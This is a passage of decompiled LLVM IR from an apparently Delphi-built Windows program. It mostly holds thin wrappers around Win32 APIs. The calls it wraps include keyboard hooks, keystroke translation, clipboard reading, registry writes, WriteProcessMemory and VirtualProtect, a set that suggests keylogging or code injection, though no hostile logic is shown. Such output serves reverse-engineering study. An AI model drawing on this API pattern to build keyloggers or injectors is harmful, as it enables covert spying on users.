  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_40a658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_40a658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_40a658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_40a660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_40a660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_40a660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
